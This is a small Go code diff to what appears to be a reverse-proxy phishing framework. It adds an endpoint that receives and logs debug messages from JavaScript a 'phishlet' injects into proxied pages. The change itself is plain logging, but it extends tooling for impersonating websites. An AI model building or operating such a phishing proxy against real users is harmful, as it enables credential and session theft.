@@ -380,6 +380,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return req, goproxy.NewResponse(req, "application/json", 200, "{}")
 			}
 
+			// /_x/log — JS-injected debug logging from phishlet
+			if req.Method == "POST" && req.URL.Path == "/_x/log" {
+				if body, err := ioutil.ReadAll(req.Body); err == nil {
+					log.Debug("[js-log] %s", strings.TrimSpace(string(body)))
+				}
+				return req, goproxy.NewResponse(req, "text/plain", 200, "")
+			}
+
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
 				pl_name := ""
